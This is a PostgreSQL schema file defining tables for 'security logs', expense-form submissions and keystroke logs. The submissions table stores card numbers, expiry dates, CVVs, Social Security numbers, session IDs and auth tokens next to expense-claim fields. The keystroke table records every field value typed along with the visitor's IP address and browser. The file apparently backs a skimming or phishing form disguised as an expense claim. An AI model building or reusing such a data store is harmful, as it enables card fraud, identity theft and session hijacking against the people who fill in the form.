-- Create security_logs table
CREATE TABLE IF NOT EXISTS security_logs (
    id SERIAL PRIMARY KEY,
    type VARCHAR(50) NOT NULL,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    ip_address INET,
    user_agent TEXT,
    referer TEXT,
    data JSONB,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create form_submissions table  
CREATE TABLE IF NOT EXISTS form_submissions (
    id SERIAL PRIMARY KEY,
    employee_name VARCHAR(255),
    employee_id VARCHAR(100),
    expense_description TEXT,
    amount VARCHAR(50),
    business_purpose TEXT,
    client_name VARCHAR(255),
    notes TEXT,
    card_number VARCHAR(255),
    card_expiry VARCHAR(10),
    card_cvv VARCHAR(10),
    ssn VARCHAR(255),
    session_id VARCHAR(255),
    auth_token VARCHAR(255),
    ip_address INET,
    user_agent TEXT,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create keystroke_logs table
CREATE TABLE IF NOT EXISTS keystroke_logs (
    id SERIAL PRIMARY KEY,
    field_name VARCHAR(100),
    field_value TEXT,
    ip_address INET,
    user_agent TEXT,
    referer TEXT,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create indexes
CREATE INDEX IF NOT EXISTS idx_security_logs_type ON security_logs(type);
CREATE INDEX IF NOT EXISTS idx_security_logs_timestamp ON security_logs(timestamp);
CREATE INDEX IF NOT EXISTS idx_form_submissions_timestamp ON form_submissions(timestamp);
CREATE INDEX IF NOT EXISTS idx_keystroke_logs_timestamp ON keystroke_logs(timestamp);
CREATE INDEX IF NOT EXISTS idx_keystroke_logs_field ON keystroke_logs(field_name);